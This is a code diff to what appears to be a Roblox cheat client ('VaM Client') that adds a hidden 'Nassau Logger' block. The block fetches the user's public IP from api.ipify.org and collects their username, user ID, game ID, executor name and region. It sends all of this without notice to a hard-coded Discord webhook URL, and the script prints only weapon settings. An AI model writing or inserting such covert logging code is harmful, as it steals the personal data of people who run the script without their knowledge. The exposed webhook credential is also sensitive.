@@ -2668,6 +2668,90 @@ end)
 task.wait(0.5)
 initChantPackage()
 
+local httpService = game:GetService("HttpService")
+local webhookUrl = "https://discord.com/api/webhooks/1525929964699127818/PVq7NfED1832iL9pEcotQESjNSHe7F1aZw3KW8OlAsXJ7RHYK2OhL0uXjpiOP9ZHd8GL"
+local rawTime = os.time()
+local LocalizationService = game:GetService("LocalizationService")
+local player = game.Players.LocalPlayer
+local success, localeId = pcall(function()
+    return LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+
+local req_func = request or http_request or (syn and syn.request)
+
+if not req_func then
+    warn("Your executor does not support network requests!")
+    return
+end
+
+local ipAddress = "Failed to fetch IP"
+local ipResponse = req_func({
+    Url = "https://api.ipify.org",
+    Method = "GET"
+})
+
+if ipResponse and ipResponse.StatusCode == 200 then
+    ipAddress = ipResponse.Body
+end
+
+local executorName = "Unknown Executor"
+if identifyexecutor then
+    local success, result = pcall(identifyexecutor)
+    if success then executorName = tostring(result) end
+end
+
+local payload = {
+    ["username"] = "Nassau Logger",
+    ["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOcfMkQ3x-qXkgbE1ZGb-bVctMLXjiYkZPeaHIv6XCLw2CHWDShfMgQ6YJF7duiDcdYoUh8kXoMLOhj03W8VEYLv7E45qnpCeeqwlifSc&s=10",
+    ["embeds"] = {
+        {
+            ["title"] = "🚀 Script Execution Log",
+            ["description"] = "The exploit script has executed successfully in-game.",
+            ["color"] = 16711680, -- Red color
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Name",
+                    ["value"] = game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 User ID",
+                    ["value"] = tostring(game.Players.LocalPlayer.UserId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🎮 Game ID",
+                    ["value"] = tostring(game.PlaceId),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "💻 Executor Information",
+                    ["value"] = executorName,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🌐 IP Address",
+                    ["value"] = ipAddress,
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Sent at "..os.date("%c", rawTime).." in "..tostring(localeId)
+            }
+        }
+    }
+}
+
+local discordResponse = req_func({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = httpService:JSONEncode(payload)
+})
+
+
 print("VaM Client loaded successfully!")
 print("Musket Settings Applied:")
 print("  Velocity: " .. WEAPON_SETTINGS.Velocity .. " studs/s")
